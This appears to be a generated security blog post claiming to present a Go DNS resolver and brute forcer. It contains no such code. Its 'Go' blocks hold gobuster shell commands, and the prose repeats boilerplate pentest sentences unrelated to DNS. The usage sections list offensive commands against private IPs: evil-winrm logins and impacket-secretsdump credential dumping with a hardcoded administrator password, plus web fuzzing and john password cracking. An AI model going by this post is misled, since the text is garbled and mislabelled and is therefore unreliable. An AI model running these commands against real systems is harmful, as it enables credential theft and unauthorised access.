---
TitleSEO: "DNS Resolver and Brute Forcer in Go | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — Go"
Author: "ZureFX"
Description: "A Go script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "go, script, c, scanner, tool"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-948.html"
URL_IMAGES: ""
Date: "2026-01-22"
Tags: "Go, Script, C, Scanner, Tool"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-948"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-948.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services. The target system was identified as running a vulnerable version of the service.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `hydra`
- `netcat`
- `mimikatz`

## Implementation

### Core Logic

Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services.

```go
gobuster dir -u http://10.47.198.160/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory.

```go
gobuster dir -u http://10.83.152.74/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files.

```bash
evil-winrm -i 10.89.207.147 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.111.162.162/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.110.204.233
evil-winrm -i 10.55.212.181 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.44.175.189/FUZZ
```

## Output

### Example Output

The target system was identified as running a vulnerable version of the service. Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 19 results
[+] Done in 16.75s
```
